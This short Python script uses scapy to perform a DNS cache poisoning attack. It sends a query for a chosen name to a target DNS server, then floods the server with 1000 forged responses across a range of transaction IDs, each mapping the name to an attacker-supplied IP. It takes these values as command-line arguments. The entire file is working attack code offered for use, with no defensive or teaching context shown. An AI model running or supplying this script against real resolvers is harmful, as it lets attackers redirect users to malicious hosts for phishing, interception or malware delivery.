from scapy.all import *
import sys

def dns_cache_poisoning_attack(qname, dns_server_ip,spoofed_ip):
    pkts = []
    for x in range(10000, 11000):		
        pkt = IP(dst=dns_server_ip)/UDP(dport=53)/DNS(id=x, qr=1, aa=1, qd=DNSQR(qname=qname), an=DNSRR(rrname=qname, type='A', rclass='IN', ttl=350, rdata=spoofed_ip))
        pkts.append(pkt)
    send(IP(dst=dns_server_ip)/UDP(dport=53)/DNS(qd=DNSQR(qname=qname)))
    for pkt in pkts:
        send(pkt)

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage : python3 dns_cache_poisoning.py <query_name> <dns_server_ip> <spoof_ip>")
        sys.exit()
    else:
        qname = sys.argv[1]
        dns_server_ip = sys.argv[2]
        spoof_ip = sys.argv[3]
        dns_cache_poisoning_attack(qname,dns_server_ip,spoof_ip)